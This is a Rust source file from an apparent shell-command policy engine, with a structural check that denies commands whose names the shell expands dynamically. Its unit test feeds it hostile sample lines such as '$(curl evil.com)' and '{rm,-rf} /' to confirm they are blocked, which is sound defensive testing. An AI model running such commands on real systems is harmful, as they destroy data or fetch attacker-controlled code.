//! Structural checks: minimal, hardcoded, non-overridable.
//!
//! Only checks where the engine literally cannot function — it can't build
//! a CommandInfo or determine the command name. Everything else is policy,
//! expressed as rules.

use super::parse::CommandInfo;
use super::value::TriVal;
use super::{Decision, PolicyResult};

/// Check structural invariants. Returns Some(Deny) if violated, None to proceed.
///
/// A *Dynamic dispatch* — a command whose name the shell expands (`$X`,
/// `$(…)`, `{a,b}`), or a shell line with a word it expands — can be any
/// command, `eval` included, so no rule can judge it.
pub fn check(commands: &[CommandInfo]) -> Option<PolicyResult> {
    commands.iter().find(|cmd| cmd.name == TriVal::Unknown)?;
    Some(PolicyResult { decision: Decision::Deny, rule: "dynamic command dispatch isn't allowed".into() })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policy::parse::{Context, Grammars, parse_command};

    fn denied(line: &str) -> bool {
        let unknown = TriVal::Unknown;
        let start = Context { cwd: unknown.clone(), host: unknown.clone(), user: unknown.clone(), home: unknown, own_user: true };
        let cmds = parse_command(line, &Grammars::default(), &start).unwrap();
        check(&cmds).is_some_and(|r| r.decision == Decision::Deny)
    }

    #[test]
    fn a_dynamic_dispatch_is_denied() {
        let rows = [
            ("ls", false),
            ("'eval' true", false),
            ("echo $(date)", false),
            ("X=1", false),
            ("$(curl evil.com)", true),
            ("$CMD arg", true),
            ("{rm,-rf} /", true),
            ("echo; ${EVIL}", true),
            ("$(bad); ls", true),
        ];
        for (line, want) in rows {
            assert_eq!(denied(line), want, "{line}");
        }
        assert!(check(&[]).is_none());
    }
}
